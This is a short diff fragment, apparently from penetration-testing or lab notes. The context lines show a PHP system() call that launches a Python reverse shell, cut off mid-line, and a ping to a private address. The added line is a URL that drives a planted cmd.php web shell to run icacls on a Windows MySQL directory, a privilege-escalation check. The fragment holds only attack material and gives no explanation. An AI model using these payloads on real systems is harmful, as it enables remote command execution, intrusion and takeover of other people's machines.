@@ -39,6 +39,8 @@ system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,so
 system("ping -c 4 192.168.1.162");
 ?>
 
+http://192.168.1.161/cmd.php?cmd=icacls "C:\Program Files\MySQL\MySQL Server 5.7\bin"
+
 
 
 
